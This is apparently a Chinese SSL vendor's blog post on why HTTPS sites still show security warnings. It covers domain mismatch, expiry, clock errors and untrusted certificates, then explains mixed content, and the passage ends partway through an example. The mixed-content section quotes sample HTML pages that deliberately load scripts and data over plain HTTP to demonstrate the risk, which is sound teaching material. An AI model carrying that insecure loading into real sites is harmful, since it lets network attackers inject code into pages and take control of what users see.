        <content type="html"><![CDATA[<p>很多朋友可能都会遇到这个让人抓狂的问题：为什么按要求部署SSL证书了，但访问网站时还是会出现不安全的提示？这里就和大家一起来看看可能导致这个问题的原因和解决方法。</p> <a id="more"></a><h1 id="为什么部署SSL证书后，还是提示不安全"><a href="#为什么部署SSL证书后，还是提示不安全" class="headerlink" title="为什么部署SSL证书后，还是提示不安全"></a>为什么部署SSL证书后，还是提示不安全</h1><p>很多朋友可能都会遇到这个让人抓狂的问题：为什么按要求部署SSL证书了，但访问网站时还是会出现不安全的提示？这里<a href="https://www.bisend.cn/">必盛云</a>就和大家一起来看看可能导致这个问题的原因和解决方法。</p><p>首先我们来看看为什么会出现不安全提示：</p><p>当我们访问一个已安装<a href="https://www.bisend.cn/ssl-certificate">SSL证书</a>的网站页面时，如果页面出现”您的连接不是私密链接“或”此网页含有不安全的内容“等类似的错误提示，这说明浏览器检查到你当前所访问的HTTPS网站的SSL证书出现问题了，存在访问风险，所以提示用户“此站点不安全”。</p><p>那么这个问题是怎么出现的呢？要怎样才能解决呢？请看下面的分析：</p><h3 id="域名不匹配"><a href="#域名不匹配" class="headerlink" title="域名不匹配"></a>域名不匹配</h3><p>HTTPS网站其中一个非常重要的作用，就是确认网站的身份。这样就能非常有效地预防DNS劫持。一张SSL证书必须对应一个网站域名，当你访问的网站域名和SSL证书中设置的域名不一致时，浏览器就会提示用户网站不安全。可能是由于配置错误导致SSL证书与网站域名不配置，也可能因为多个域名都能使用同一张SSL证书，导致域名与SSL证书不匹配。</p><p>此种情况下，需要站长确认域名与所部署的SSL证书是否相匹配，如不匹配需及时替换为正确的证书。</p><h3 id="证书到期"><a href="#证书到期" class="headerlink" title="证书到期"></a>证书到期</h3><p>这个原因非常好理解，即您的SSL证书到期需要续费重新申请了； SSL证书过期也是导致出现错误的原因之一。一般SSL证书的有效期为1~2年，当证书过期后，就必须要更新证书，HTTPS网站才能继续正常工作。否则过了有效期就会提示错误。可能有的站长管理很多网站，在证书到期之后重新安装会非常耗时，希望申请证书的有效期能长一点，但从CA（Certificate Authority证书颁发机构）的角度来看，设置证书有效期是非常有必要的。</p><p>首先是为了安全考虑，CA机构不能保证一个网站永远是合法的，因此它需要定期检查网站。其次，涉及到证书吊销。当网站的私钥丢失时，网站应该向CA申请将他们的证书加入到证书吊销列表（CRL）里。当用户访问https站点时，浏览器会自动向CA请求吊销列表，如果用户访问的站点提供的证书在CRL里，浏览器就不信任这个证书，因为攻击者可能拥有同样的证书。所以如果证书永久有效，随着越来越多的私钥丢失，吊销列表也越来越大，因为只有加进去的，没有剔出去的，这既给CA增加流量压力，也会增加浏览器的流量。而一旦有效期只有几年，那么CA就可以将那些已经过期了的证书从CRL里剔除，因为反正浏览器也不信任过期证书。</p><h3 id="系统时间错误"><a href="#系统时间错误" class="headerlink" title="系统时间错误"></a>系统时间错误</h3><p>另外一个常见的原因，是客户端的系统时间错误。浏览器会判断SSL证书是否过期，而浏览器的时间判断是依照你的系统时间。假如你的系统时间不正确，那么很有可能浏览器就会出现误判的情况，导致一张还没过期的SSL证书被认为是过期了。最终页面显示错误提示。解决办法也非常简单，修改您的系统时间为正确的就可以了。</p><h3 id="不受信任的SSL证书"><a href="#不受信任的SSL证书" class="headerlink" title="不受信任的SSL证书"></a>不受信任的SSL证书</h3><p>一些站长或者个人站长由于经费上的预算有限，又恰好懂得一些代码，自己制作出一张自签名的SSL证书或向一些SSL证书服务商申请不受信任的SSL证书。但现在浏览器对SSL证书的管理也更加严格，这些使用自签名SSL证书或不受信任的SSL证书部署的网站是不被浏览器信任的，所以访问时仍然会出现错误提示。因为自签名证书或小型SSL证书并不在操作系统的可信任根证书之中。只有是由受信任根证书所签发出来的SSL证书，浏览器才会认为是安全的，其他的SSL证书浏览器一律都会提示错误。</p><h3 id="站内调用非HTTPS素材"><a href="#站内调用非HTTPS素材" class="headerlink" title="站内调用非HTTPS素材"></a>站内调用非HTTPS素材</h3><p>站内调用非HTTPS素材包括图文、CSS、js等素材。出现这种情形时，一般在浏览器安全锁处会看到锁出现了一个三角形图形，点击查看SSL证书详细信息能看到有感叹号说明。下面我们就来看看如何解决这一问题：</p><p>首先您可以通过按住键盘上的F12键进入开发者模式，或者鼠标放在页面空白处点击右键后选择“查看网页源代码”，之后就可以在右侧边框找是哪些非安全链接导至整个网站不被信任。</p><p><img src="https://www.bisend.cn/blog/wp-content/uploads/2019/09/1.jpeg" alt="img"></p><p>查看上图中找到的两个链接，的确是http的素材路径。</p><p><img src="https://www.bisend.cn/blog/wp-content/uploads/2019/09/2.jpeg" alt="img"></p><p>那么现在我们需要做的就是检查这两个链接是否为有用链接；如果这个链接没有什么作用，删掉也不会对网站有任何影响，那么直接删除就行了。然后继续检查直至清除所有无用的非安全链接。完成清理后，再清除浏览器缓存，则可以看到网站已经重新被浏览器信任了。</p><p><img src="https://www.bisend.cn/blog/wp-content/uploads/2019/09/u20jw3wl6p.jpeg" alt="img"></p><p>现在再来看看第二种情况，如果这个元素或图片/CSS/JS是对网站极为重要的内容，绝对不可以删除。此时，则只需把源站的非安全素材的路径由绝对路径放置在本站文件夹变成相对路径。</p><h1 id="什么是混合内容？"><a href="#什么是混合内容？" class="headerlink" title="什么是混合内容？"></a>什么是混合内容？</h1><p><strong>混合内容</strong>在以下情况下出现：初始 HTML 内容通过安全的 HTTPS 连接加载，但其他资源（例如，图像、视频、样式表、脚本）则通过不安全的 HTTP 连接加载。之所以称为混合内容，是因为同时加载了 HTTP 和 HTTPS 内容以显示同一个页面，且通过 HTTPS 加载的初始请求是安全的。现代浏览器会针对此类型的内容显示警告，以向用户表明此页面包含不安全的资源。</p><h3 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h3><ul><li>HTTPS 对于保护您的网站和用户免受攻击非常重要。</li><li>混合内容会降低您的 HTTPS 网站的安全性和用户体验。</li></ul><h2 id="资源请求和网络浏览器"><a href="#资源请求和网络浏览器" class="headerlink" title="资源请求和网络浏览器"></a>资源请求和网络浏览器</h2><p>当浏览器访问网站的页面时，它将请求 HTML 资源。然后，网络服务器返回 HTML 内容，浏览器进行解析并显示给用户。通常，一个 HTML 文件不足以显示一个完整页面，因此，HTML 文件包含浏览器需要请求的其他资源的引用。这些子资源可以是图像、视频、额外 HTML、CSS 或 JavaScript 之类的资源；每个资源均使用单独的请求获取。</p><h2 id="HTTPS-的优势"><a href="#HTTPS-的优势" class="headerlink" title="HTTPS 的优势"></a>HTTPS 的优势</h2><p>当浏览器通过 HTTPS（HTTP Secure 的缩写形式）请求资源时，它使用一个已加密连接与网络服务器进行通信。</p><p>使用 HTTPS 有三个主要优势：</p><ul><li>身份验证</li><li>数据完整性</li><li>保密性</li></ul><h3 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h3><p>我正在访问的网站是正确的吗？</p><p>HTTPS 让浏览器检查并确保其已打开正确的网站，并且没有被重定向到恶意的网站。 当导航到您的银行网站时，您的浏览器对该网站进行身份验证，从而防止攻击者冒充您的银行窃取您的登录凭据。</p><h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h3><p>是否有人篡改我正在发送或接收的内容？</p><p>HTTPS 让浏览器检测是否有攻击者更改了浏览器接收的任何数据。 使用您的银行网站转账时，这样做可防止当您的请求在传输中时攻击者更改目标帐号。</p><h3 id="保密性"><a href="#保密性" class="headerlink" title="保密性"></a>保密性</h3><p>是否有人能看到我正在发送或接收的内容？</p><p>HTTPS 可防止攻击者窃取浏览器的请求，跟踪访问的网站或窃取已发送或接收的信息。</p><h3 id="HTTPS、传输层安全协议-TLS-和-SSL"><a href="#HTTPS、传输层安全协议-TLS-和-SSL" class="headerlink" title="HTTPS、传输层安全协议 (TLS) 和 SSL"></a>HTTPS、传输层安全协议 (TLS) 和 SSL</h3><p>HTTPS 是 HTTP Secure 的缩写，即超文本传输安全协议。此处的 <strong>secure</strong> 部分来自于添加到浏览器发送和接收的请求的加密。目前大多数浏览器都使用传输层安全协议 (TLS) 提供加密；<strong>TLS</strong> 有时称为 SSL。</p><ul><li><a href="https://en.wikipedia.org/wiki/HTTPS">Wikipedia HTTPS</a></li><li><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">Wikipedia TLS</a></li><li><a href="https://www.khanacademy.org/computing/computer-science/cryptography">可汗学院 (Khan Academy) 的加密课程</a></li><li><a href="https://hpbn.co/">高性能浏览器网络</a>（作者：Ilya Grigorik）中的<a href="https://hpbn.co/transport-layer-security-tls/">传输层安全协议 (TLS) 章节</a></li></ul><h2 id="混合内容会降低-HTTPS-的安全性"><a href="#混合内容会降低-HTTPS-的安全性" class="headerlink" title="混合内容会降低 HTTPS 的安全性"></a>混合内容会降低 HTTPS 的安全性</h2><p>使用不安全的 HTTP 协议请求子资源会降低整个页面的安全性，因为这些请求容易受到<strong>中间人攻击</strong>，攻击者窃听网络连接，查看或修改双方的通信。通过使用这些资源，攻击者通常可以完全控制页面，而不只是泄露的资源。</p><p>尽管许多浏览器向用户报告混合内容警告，但出现警告时为时已晚：不安全的请求已被执行，且页面的安全性被破坏。遗憾的是，这种情况在网络中很普遍，正因如此，浏览器不能简单地阻止所有混合请求，否则将会限制许多网站的功能。</p><p><img src="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/imgs/image-gallery-warning.png?hl=zh-cn" alt="混合内容：页面已通过 HTTPS 加载，但请求了不安全的图像。此内容也应通过 HTTPS 提供。">修正应用中的混合内容问题是开发者的责任。</p><h3 id="一个简单的示例"><a href="#一个简单的示例" class="headerlink" title="一个简单的示例"></a>一个简单的示例</h3><p>从 HTTPS 页面加载不安全的脚本。</p><p>查看通过 <strong>HTTPS</strong>—<a href="https://googlesamples.github.io/web-fundamentals/fundamentals/security/prevent-mixed-content/simple-example.html"><strong>https</strong>://googlesamples.github.io/web-fundamentals/…/simple-example.html</a>加载的此示例页面 — 添加一个 <strong>HTTP</strong> 脚本标记，其尝试加载混合内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt;</span><br><span class="line">    &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      body &#123;</span><br><span class="line">        margin: 2em;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">    &lt;title&gt;Simple mixed content example&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div role&#x3D;&quot;main&quot;&gt;</span><br><span class="line">      &lt;h1&gt;</span><br><span class="line">        Simple mixed content example!</span><br><span class="line">      &lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;simple-example.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;simple-example.html&quot;&gt;HTTPS&lt;&#x2F;a&gt;</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        This page loads the script simple-example.js using HTTP. This is the simplest case of mixed content. When the simple-example.js file is requested by the browser, an attacker can inject code into the returned content and take control of the entire page. Thankfully, most modern browsers block this type of dangerous content by default and display an error in the JavaScript console. This can be seen when the page is viewed over HTTPS.</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;div id&#x3D;&quot;output&quot;&gt;Waiting for insecure script to run...&lt;&#x2F;div&gt;</span><br><span class="line">      &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;simple-example.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">  (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D;</span><br><span class="line">  function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date;</span><br><span class="line">  e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0];</span><br><span class="line">  e.src&#x3D;&#39;https:&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;;</span><br><span class="line">  r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;));</span><br><span class="line">  ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;);</span><br><span class="line">  var isCompleted &#x3D; &#123;&#125;;</span><br><span class="line">  function sampleCompleted(sampleName)&#123;</span><br><span class="line">    if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123;</span><br><span class="line">      ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;); </span><br><span class="line">      isCompleted[sampleName] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><a href="https://googlesamples.github.io/web-fundamentals/fundamentals/security/prevent-mixed-content/simple-example.html">试一下</a></p><p>在此示例中，使用一个 <strong>HTTP</strong> 网址加载脚本 <code>simple-example.js</code>。这是最简单的混合内容案例。浏览器请求 <code>simple-example.js</code> 文件时，攻击者可以将代码注入返回的内容，并控制整个页面。</p><p>幸运的是，大多数现代浏览器均默认阻止此类危险的内容。 请参阅<a href="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/what-is-mixed-content?hl=zh-cn#browser-behavior-with-mixed-content">具有混合内容的浏览器行为</a>。</p><p><img src="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/imgs/simple-mixed-content-error.png?hl=zh-cn" alt="混合内容：页面已通过 HTTPS 加载，但请求了不安全的脚本。此请求已被阻止，内容必须通过 HTTPS 提供。">Chrome 可阻止不安全的脚本。</p><h3 id="一个-XMLHttpRequest-示例"><a href="#一个-XMLHttpRequest-示例" class="headerlink" title="一个 XMLHttpRequest 示例"></a>一个 XMLHttpRequest 示例</h3><p>通过 XMLHttpRequest 加载不安全的数据。</p><p>查看通过 <strong>HTTPS</strong>—<a href="https://googlesamples.github.io/web-fundamentals/fundamentals/security/prevent-mixed-content/xmlhttprequest-example.html"><strong>https</strong>://googlesamples.github.io/web-fundamentals/…/xmlhttprequest-example.html</a> 加载的此示例页面 — 添加一个通过 <strong>HTTP</strong> 加载的<code>XMLHttpRequest</code>，以获取混合内容 <code>JSON</code> 数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt;</span><br><span class="line">    &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      body &#123;</span><br><span class="line">        margin: 2em;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">    &lt;title&gt;XMLHttpRequest mixed content example&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div role&#x3D;&quot;main&quot;&gt;</span><br><span class="line">      &lt;h1&gt;</span><br><span class="line">        XMLHttpRequest mixed content example!</span><br><span class="line">      &lt;&#x2F;h1&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;xmlhttprequest-example.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;xmlhttprequest-example.html&quot;&gt;HTTPS&lt;&#x2F;a&gt;</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;p&gt;</span><br><span class="line">        This page constructs an HTTP URL dynamically in JavaScript, the URL is eventually used to load an insecure resource by XMLHttpRequest. When the xmlhttprequest-data.js file is requested by the browser, an attacker can inject code into the returned content and take control of the entire page. Thankfully, most modern browsers block this type of dangerous content by default and display an error in the JavaScript console. This can be seen when the page is viewed over HTTPS.</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">      &lt;div id&#x3D;&quot;output&quot;&gt;Waiting for data...&lt;&#x2F;div&gt;</span><br><span class="line">      &lt;script&gt;</span><br><span class="line">        var rootUrl &#x3D; &#39;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#39;;</span><br><span class="line">        var resources &#x3D; &#123;</span><br><span class="line">          jsonData: &#39;&#x2F;xmlhttprequest-data.js&#39;</span><br><span class="line">        &#125;;</span><br><span class="line">        var request &#x3D; new XMLHttpRequest();</span><br><span class="line">        request.addEventListener(&#39;load&#39;, function() &#123;</span><br><span class="line">          var jsonData &#x3D; JSON.parse(request.responseText);</span><br><span class="line">          document.getElementById(&#39;output&#39;).innerHTML +&#x3D; &#39;&lt;br&gt;&#39; + jsonData.data;</span><br><span class="line">        &#125;);</span><br><span class="line">        request.open(&#39;GET&#39;, rootUrl + resources.jsonData, true);</span><br><span class="line">        request.send();</span><br><span class="line">      &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">  (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D;</span><br><span class="line">  function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date;</span><br><span class="line">  e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0];</span><br><span class="line">  e.src&#x3D;&#39;&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;;</span><br><span class="line">  r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;));</span><br><span class="line">  ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;);</span><br><span class="line">  var isCompleted &#x3D; &#123;&#125;;</span><br><span class="line">  function sampleCompleted(sampleName)&#123;</span><br><span class="line">    if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123;</span><br><span class="line">      ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;); </span><br><span class="line">      isCompleted[sampleName] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><a href="https://googlesamples.github.io/web-fundamentals/fundamentals/security/prevent-mixed-content/xmlhttprequest-example.html">试一下</a></p><p>下面的 <strong>HTTP</strong> 网址是在 JavaScript 中动态构建的，并且最终被 <code>XMLHttpRequest</code> 用于加载不安全的资源。 与上面简单的示例相似，当浏览器请求 <code>xmlhttprequest-data.js</code> 文件时，攻击者可以将代码注入返回的内容中，并控制整个页面。</p><p>大多数现代浏览器也会阻止这些危险的请求。</p><p><img src="https://developers.google.com/web/fundamentals/security/prevent-mixed-content/imgs/xmlhttprequest-mixed-content-error.png?hl=zh-cn" alt="混合内容：页面已通过 HTTPS 加载，但请求了不安全的 XMLHttpRequest 端点。此请求已被阻止，内容必须通过 HTTPS 提供。">Chrome 可阻止不安全的 XMLHttpRequest。</p><h3 id="图像库示例"><a href="#图像库示例" class="headerlink" title="图像库示例"></a>图像库示例</h3><p>使用 jQuery 灯箱加载不安全的图像。</p><p>查看通过 <strong>HTTPS</strong>—<a href="https://googlesamples.github.io/web-fundamentals/fundamentals/security/prevent-mixed-content/image-gallery-example.html"><strong>https</strong>://googlesamples.github.io/web-fundamentals/…/image-gallery-example.html</a> 加载的此示例页面时 — 最初没有任何混合内容问题；但是当点击缩略图时，将通过 <strong>HTTP</strong> 加载完整尺寸的混合内容图像。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt;</span><br><span class="line">    &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      body &#123;</span><br><span class="line">        margin: 2em;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">    &lt;title&gt;Image gallery mixed content example&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;www.gstatic.com&#x2F;external_hosted&#x2F;jquery2.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      $(function() &#123;</span><br><span class="line">        $(&#39;.gallery&#39;).click(function(e) &#123;</span><br><span class="line">          e.preventDefault();</span><br><span class="line">          $(&#39;.overlay-foreground&#39;).css(&#39;background-image&#39;, &#39;url(&#39; + $(this).attr(&#39;href&#39;) + &#39;)&#39;);</span><br><span class="line">          $(&#39;.overlay&#39;).fadeIn(&#39;slow&#39;);</span><br><span class="line">        &#125;)</span><br><span class="line">        $(&#39;.overlay&#39;).click(function() &#123;</span><br><span class="line">          $(&#39;.overlay&#39;).fadeOut(&#39;slow&#39;);</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .overlay &#123;</span><br><span class="line">        position: fixed;</span><br><span class="line">        top: 0;</span><br><span class="line">        left: 0;</span><br><span class="line">        width: 100%;</span><br><span class="line">        height: 100%;</span><br><span class="line">      &#125;</span><br><span class="line">      .overlay-background &#123;</span><br><span class="line">        background-color: #000;</span><br><span class="line">        filter:alpha(opacity&#x3D;80);</span><br><span class="line">        